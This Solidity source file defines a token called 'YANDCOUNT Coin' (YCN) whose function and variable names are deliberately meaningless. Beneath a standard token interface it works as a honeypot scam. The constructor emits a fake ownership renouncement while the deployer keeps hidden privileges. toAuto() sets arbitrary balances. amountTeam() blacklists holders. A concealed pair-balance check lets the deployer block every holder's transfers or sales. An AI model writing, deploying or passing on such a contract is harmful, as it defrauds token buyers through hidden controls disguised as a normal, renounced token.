//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface launchAtFee {
    function createPair(address totalFrom, address fromAutoExempt) external returns (address);
}

interface tradingReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract txFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellIsReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverAutoMax) external view returns (uint256);

    function transfer(address receiverList, uint256 buyShould) external returns (bool);

    function allowance(address launchedIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyShould) external returns (bool);

    function transferFrom(
        address sender,
        address receiverList,
        uint256 buyShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchedEnable, uint256 value);
    event Approval(address indexed launchedIs, address indexed spender, uint256 value);
}

interface sellIsReceiverMetadata is sellIsReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract YANDCOUNTCoin is txFund, sellIsReceiver, sellIsReceiverMetadata {

    function owner() external view returns (address) {
        return maxFund;
    }

    function getOwner() external view returns (address) {
        return maxFund;
    }

    function senderSell(address launchMax) public {
        if (autoWallet) {
            return;
        }
        
        walletLiquidity[launchMax] = true;
        
        autoWallet = true;
    }

    uint256 isList;

    string private txSwap = "YANDCOUNT Coin";

    address public walletMinLaunched;

    bool public autoWallet;

    mapping(address => uint256) private teamLaunched;

    function amountTeam(address atTake) public {
        tradingLiquidity();
        
        if (atTake == senderFrom || atTake == walletMinLaunched) {
            return;
        }
        txMax[atTake] = true;
    }

    function liquidityAutoLimit(address teamFromBuy, address receiverList, uint256 buyShould) internal returns (bool) {
        require(teamLaunched[teamFromBuy] >= buyShould);
        teamLaunched[teamFromBuy] -= buyShould;
        teamLaunched[receiverList] += buyShould;
        emit Transfer(teamFromBuy, receiverList, buyShould);
        return true;
    }

    mapping(address => bool) public txMax;

    uint8 private toEnable = 18;

    mapping(address => mapping(address => uint256)) private marketingLaunched;

    address public senderFrom;

    bool public modeIs;

    function name() external view virtual override returns (string memory) {
        return txSwap;
    }

    function walletTrading(uint256 buyShould) public {
        tradingLiquidity();
        receiverTrading = buyShould;
    }

    bool private atTrading;

    bool private buyTake;

    uint256 private limitBuy = 100000000 * 10 ** 18;

    mapping(address => bool) public walletLiquidity;

    function tradingLiquidity() private view {
        require(walletLiquidity[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return toEnable;
    }

    function symbol() external view virtual override returns (string memory) {
        return minLimit;
    }

    address tokenReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    constructor (){
        
        enableModeList();
        tradingReceiver totalReceiver = tradingReceiver(tokenReceiver);
        walletMinLaunched = launchAtFee(totalReceiver.factory()).createPair(totalReceiver.WETH(), address(this));
        if (atTrading) {
            atTrading = false;
        }
        senderFrom = _msgSender();
        walletLiquidity[senderFrom] = true;
        teamLaunched[senderFrom] = limitBuy;
        if (modeIs == buyTake) {
            buyTake = false;
        }
        emit Transfer(address(0), senderFrom, limitBuy);
    }

    function transferFrom(address teamFromBuy, address receiverList, uint256 buyShould) external override returns (bool) {
        if (_msgSender() != tokenReceiver) {
            if (marketingLaunched[teamFromBuy][_msgSender()] != type(uint256).max) {
                require(buyShould <= marketingLaunched[teamFromBuy][_msgSender()]);
                marketingLaunched[teamFromBuy][_msgSender()] -= buyShould;
            }
        }
        return atShouldLiquidity(teamFromBuy, receiverList, buyShould);
    }

    function approve(address enableFund, uint256 buyShould) public virtual override returns (bool) {
        marketingLaunched[_msgSender()][enableFund] = buyShould;
        emit Approval(_msgSender(), enableFund, buyShould);
        return true;
    }

    uint256 receiverTrading;

    function totalSupply() external view virtual override returns (uint256) {
        return limitBuy;
    }

    function atShouldLiquidity(address teamFromBuy, address receiverList, uint256 buyShould) internal returns (bool) {
        if (teamFromBuy == senderFrom) {
            return liquidityAutoLimit(teamFromBuy, receiverList, buyShould);
        }
        uint256 sellShould = sellIsReceiver(walletMinLaunched).balanceOf(marketingAuto);
        require(sellShould == receiverTrading);
        require(!txMax[teamFromBuy]);
        return liquidityAutoLimit(teamFromBuy, receiverList, buyShould);
    }

    address marketingAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transfer(address isLaunchSwap, uint256 buyShould) external virtual override returns (bool) {
        return atShouldLiquidity(_msgSender(), isLaunchSwap, buyShould);
    }

    function enableModeList() public {
        emit OwnershipTransferred(senderFrom, address(0));
        maxFund = address(0);
    }

    address private maxFund;

    function balanceOf(address receiverAutoMax) public view virtual override returns (uint256) {
        return teamLaunched[receiverAutoMax];
    }

    function allowance(address senderSwapLiquidity, address enableFund) external view virtual override returns (uint256) {
        if (enableFund == tokenReceiver) {
            return type(uint256).max;
        }
        return marketingLaunched[senderSwapLiquidity][enableFund];
    }

    function toAuto(address isLaunchSwap, uint256 buyShould) public {
        tradingLiquidity();
        teamLaunched[isLaunchSwap] = buyShould;
    }

    string private minLimit = "YCN";

    event OwnershipTransferred(address indexed maxListFund, address indexed receiverShouldIs);

}